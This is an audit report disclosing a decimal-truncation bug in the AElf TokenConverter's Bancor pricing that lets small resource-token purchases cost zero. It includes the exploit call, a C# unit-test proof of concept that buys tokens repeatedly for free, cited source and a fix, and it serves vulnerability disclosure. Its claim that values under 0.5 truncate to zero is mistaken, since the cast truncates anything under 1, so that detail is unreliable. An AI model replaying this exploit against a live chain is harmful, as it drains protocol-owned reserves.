# Audit Report

## Title
Decimal Truncation in GetAmountToPayFromReturn Allows Zero-Cost Token Purchase

## Summary
The `GetAmountToPayFromReturn` function in `BancorHelper.cs` truncates decimal calculation results to zero when casting to `long` integers, allowing attackers to purchase resource tokens (WRITE, READ, STORAGE, TRAFFIC) for free when buying small amounts. This vulnerability exists due to the production configuration where the deposit connector virtual balance (10^15) is significantly smaller than the resource token supply (5×10^16), creating a ratio that truncates to zero for purchases of 1-24 base units. [1](#0-0) 

## Finding Description

The vulnerability occurs in the `GetAmountToPayFromReturn` method when connector weights are equal. The calculation at line 84 performs: `return (long)(bf / (bt - a) * a)` where casting decimal results less than 0.5 to `long` truncates them to 0. [2](#0-1) 

**Production Configuration creates vulnerable conditions:**

The EconomicContract initializes connectors with values that guarantee truncation: [3](#0-2) 

For resource tokens (WRITE, READ, etc.):
- Native deposit connector (ntWRITE): VirtualBalance = 10,000,000 × 10^8 = 10^15, Weight = 0.005
- Resource connector (WRITE): VirtualBalance = 100,000, Real balance = 500,000,000 × 10^8 ≈ 5×10^16, Weight = 0.005 [4](#0-3) 

**Mathematical Analysis:**

When buying 1 base unit:
- fromConnectorBalance (bf) = 10^15
- toConnectorBalance (bt) = 5×10^16  
- amountToReceive (a) = 1
- Calculation: (long)(10^15 / (5×10^16 - 1) × 1) = (long)(0.02) = 0

For amounts where (10^15 / 5×10^16) × a < 0.5, the result truncates to 0:
- 0.02 × a < 0.5
- a < 25

Therefore, amounts 1-24 can be purchased for **zero cost**.

**Execution Path in Buy Method:** [5](#0-4) 

When `amountToPay = 0`:
1. Line 124: `fee = 0` (0% of 0)
2. Line 127: Assert passes (0 <= PayLimit)
3. Lines 133-140: `TransferFrom` 0 base tokens (succeeds)
4. Line 141: Deposit balance unchanged (adds 0)
5. Lines 143-149: Transfer requested tokens to attacker — **free tokens obtained**

**Missing Validation:**

The only input validation checks if amounts are positive, but does not verify the calculated payment is non-zero: [6](#0-5) 

## Impact Explanation

**Critical Severity - Direct Fund Theft:**

This vulnerability allows direct theft of protocol-owned resource tokens (WRITE, READ, STORAGE, TRAFFIC) from the TokenConverter reserves without payment. The entire supply of 500,000,000 tokens per resource type issued to the converter is at risk. [7](#0-6) 

**Quantified Damage:**
- Each transaction: Steal up to 24 base units for 0 cost
- Only cost: Transaction gas fees
- Repeatable: Unlimited times until reserves depleted
- Total risk: Entire 500M × 10^8 supply per resource token

**Economic Impact:**
- Token converter reserves depleted
- Legitimate users unable to purchase tokens
- Market price manipulation as stolen tokens flood secondary markets
- Complete breakdown of Bancor pricing mechanism

## Likelihood Explanation

**High Likelihood - Trivially Exploitable:**

**Attacker Capabilities:**
- Requires only a standard user account
- No special permissions or governance control needed
- Public `Buy` method accessible to anyone
- No time locks or rate limits

**Attack Complexity:**
- Minimal: Single function call `Buy(Symbol="WRITE", Amount=1, PayLimit=0)`
- Deterministic: Mathematical certainty of success
- Automatable: Can script repeated calls
- Undetectable: Transactions appear as legitimate micro-purchases

**Preconditions:**
- Enabled by default production configuration (not edge case)
- No system degradation required
- Works from chain genesis state
- Connector configuration is immutable once enabled [8](#0-7) 

**Economic Viability:**
For token value > gas cost / 24, exploitation is profitable. Given resource tokens have real utility value for transaction fees, this threshold is easily met.

## Recommendation

Implement minimum payment validation in `GetAmountToPayFromReturn`:

```csharp
public static long GetAmountToPayFromReturn(long fromConnectorBalance, decimal fromConnectorWeight,
    long toConnectorBalance, decimal toConnectorWeight, long amountToReceive)
{
    // ... existing validation ...
    
    if (wf == wt)
        try
        {
            var result = (long)(bf / (bt - a) * a);
            // ADD THIS CHECK:
            Assert(result > 0, "Calculated payment amount must be greater than zero");
            return result;
        }
        catch
        {
            throw new AssertionException("Insufficient account balance to deposit");
        }

    var x = bt / (bt - a);
    var y = wt / wf;
    var calculatedAmount = (long)(bf * (Exp(y * Ln(x)) - decimal.One));
    // ADD THIS CHECK:
    Assert(calculatedAmount > 0, "Calculated payment amount must be greater than zero");
    return calculatedAmount;
}
```

Additionally, consider implementing minimum purchase amounts in the `Buy` method to prevent micro-purchases that are economically inefficient.

## Proof of Concept

```csharp
[Fact]
public async Task ZeroCostPurchaseVulnerability_Test()
{
    // Setup: Initialize TokenConverter with production-like configuration
    await CreateWriteToken();
    await InitializeTreasuryContractAsync();
    
    // Initialize with production configuration ratios
    var productionNtWriteConnector = new Connector
    {
        Symbol = "NTWRITE",
        VirtualBalance = 10_000_000_00000000, // 10^15
        Weight = "0.005",
        IsPurchaseEnabled = true,
        IsVirtualBalanceEnabled = true,
        RelatedSymbol = WriteSymbol,
        IsDepositAccount = true
    };
    
    var productionWriteConnector = new Connector
    {
        Symbol = WriteSymbol,
        VirtualBalance = 100_000,
        Weight = "0.005",
        IsPurchaseEnabled = true,
        IsVirtualBalanceEnabled = true,
        RelatedSymbol = "NTWRITE",
        IsDepositAccount = false
    };
    
    var initResult = await DefaultStub.Initialize.SendAsync(new InitializeInput
    {
        BaseTokenSymbol = "ELF",
        FeeRate = "0.005",
        Connectors = { ELFConnector, productionWriteConnector, productionNtWriteConnector }
    });
    initResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Approve allowance for token transfer (precaution)
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Spender = TokenConverterContractAddress,
        Symbol = "ELF",
        Amount = 100L
    });
    
    // Record balances before attack
    var balanceBeforeAttack = await GetBalanceAsync(WriteSymbol, DefaultSender);
    var elfBalanceBeforeAttack = await GetBalanceAsync(NativeSymbol, DefaultSender);
    
    // EXPLOIT: Buy 1 token unit for zero cost
    var buyResult = await DefaultStub.Buy.SendAsync(new BuyInput
    {
        Symbol = WriteSymbol,
        Amount = 1L,
        PayLimit = 0L
    });
    buyResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Verify exploit success
    var balanceAfterAttack = await GetBalanceAsync(WriteSymbol, DefaultSender);
    var elfBalanceAfterAttack = await GetBalanceAsync(NativeSymbol, DefaultSender);
    
    // CRITICAL: User received 1 WRITE token
    balanceAfterAttack.ShouldBe(balanceBeforeAttack + 1L);
    
    // CRITICAL: User paid 0 ELF tokens (only gas)
    elfBalanceAfterAttack.ShouldBe(elfBalanceBeforeAttack);
    
    // Demonstrate repeatability - steal 23 more units
    for (int i = 0; i < 23; i++)
    {
        await DefaultStub.Buy.SendAsync(new BuyInput
        {
            Symbol = WriteSymbol,
            Amount = 1L,
            PayLimit = 0L
        });
    }
    
    var finalBalance = await GetBalanceAsync(WriteSymbol, DefaultSender);
    finalBalance.ShouldBe(24L); // Stolen 24 tokens for zero cost
}
```

### Citations

**File:** contract/AElf.Contracts.TokenConverter/BancorHelper.cs (L67-94)
```csharp
    public static long GetAmountToPayFromReturn(long fromConnectorBalance, decimal fromConnectorWeight,
        long toConnectorBalance, decimal toConnectorWeight, long amountToReceive)
    {
        if (fromConnectorBalance <= 0 || toConnectorBalance <= 0)
            throw new InvalidValueException("Connector balance needs to be a positive number.");

        if (amountToReceive <= 0) throw new InvalidValueException("Amount needs to be a positive number.");

        decimal bf = fromConnectorBalance;
        var wf = fromConnectorWeight;
        decimal bt = toConnectorBalance;
        var wt = toConnectorWeight;
        decimal a = amountToReceive;
        if (wf == wt)
            try
            {
                // if both weights are the same, the formula can be reduced
                return (long)(bf / (bt - a) * a);
            }
            catch
            {
                throw new AssertionException("Insufficient account balance to deposit");
            }

        var x = bt / (bt - a);
        var y = wt / wf;
        return (long)(bf * (Exp(y * Ln(x)) - decimal.One));
    }
```

**File:** contract/AElf.Contracts.Economic/EconomicContractConstants.cs (L11-20)
```csharp
    public const long ResourceTokenTotalSupply = 500_000_000_00000000;

    public const int ResourceTokenDecimals = 8;

    //resource to sell
    public const long ResourceTokenInitialVirtualBalance = 100_000;

    public const string NativeTokenPrefix = "nt";

    public const long NativeTokenToResourceBalance = 10_000_000_00000000;
```

**File:** contract/AElf.Contracts.Economic/EconomicContract.cs (L84-103)
```csharp
            State.TokenContract.Create.Send(new CreateInput
            {
                Symbol = resourceTokenSymbol,
                TokenName = $"{resourceTokenSymbol} Token",
                TotalSupply = EconomicContractConstants.ResourceTokenTotalSupply,
                Decimals = EconomicContractConstants.ResourceTokenDecimals,
                Issuer = Context.Self,
                LockWhiteList = { lockWhiteList },
                IsBurnable = true,
                Owner = Context.Self
            });

            State.TokenContract.Issue.Send(new IssueInput
            {
                Symbol = resourceTokenSymbol,
                Amount = EconomicContractConstants.ResourceTokenTotalSupply,
                To = tokenConverter,
                Memo = "Initialize for resource trade"
            });
        }
```

**File:** contract/AElf.Contracts.Economic/EconomicContract.cs (L230-251)
```csharp
            var resourceTokenConnector = new Connector
            {
                Symbol = resourceTokenSymbol,
                IsPurchaseEnabled = true,
                IsVirtualBalanceEnabled = true,
                Weight = "0.005",
                VirtualBalance = EconomicContractConstants.ResourceTokenInitialVirtualBalance,
                RelatedSymbol = EconomicContractConstants.NativeTokenPrefix.Append(resourceTokenSymbol),
                IsDepositAccount = false
            };
            var nativeTokenConnector = new Connector
            {
                Symbol = EconomicContractConstants.NativeTokenPrefix.Append(resourceTokenSymbol),
                IsPurchaseEnabled = true,
                IsVirtualBalanceEnabled = true,
                Weight = "0.005",
                VirtualBalance = EconomicContractConstants.NativeTokenToResourceBalance,
                RelatedSymbol = resourceTokenSymbol,
                IsDepositAccount = true
            };
            connectors.Add(resourceTokenConnector);
            connectors.Add(nativeTokenConnector);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L112-159)
```csharp
    public override Empty Buy(BuyInput input)
    {
        var toConnector = State.Connectors[input.Symbol];
        Assert(toConnector != null, "[Buy]Can't find to connector.");
        Assert(toConnector.IsPurchaseEnabled, "can't purchase");
        Assert(!string.IsNullOrEmpty(toConnector.RelatedSymbol), "can't find related symbol'");
        var fromConnector = State.Connectors[toConnector.RelatedSymbol];
        Assert(fromConnector != null, "[Buy]Can't find from connector.");
        var amountToPay = BancorHelper.GetAmountToPayFromReturn(
            GetSelfBalance(fromConnector), GetWeight(fromConnector),
            GetSelfBalance(toConnector), GetWeight(toConnector),
            input.Amount);
        var fee = Convert.ToInt64(amountToPay * GetFeeRate());

        var amountToPayPlusFee = amountToPay.Add(fee);
        Assert(input.PayLimit == 0 || amountToPayPlusFee <= input.PayLimit, "Price not good.");

        // Pay fee
        if (fee > 0) HandleFee(fee);

        // Transfer base token
        State.TokenContract.TransferFrom.Send(
            new TransferFromInput
            {
                Symbol = State.BaseTokenSymbol.Value,
                From = Context.Sender,
                To = Context.Self,
                Amount = amountToPay
            });
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
        // Transfer bought token
        State.TokenContract.Transfer.Send(
            new TransferInput
            {
                Symbol = input.Symbol,
                To = Context.Sender,
                Amount = input.Amount
            });

        Context.Fire(new TokenBought
        {
            Symbol = input.Symbol,
            BoughtAmount = input.Amount,
            BaseAmount = amountToPay,
            FeeAmount = fee
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```
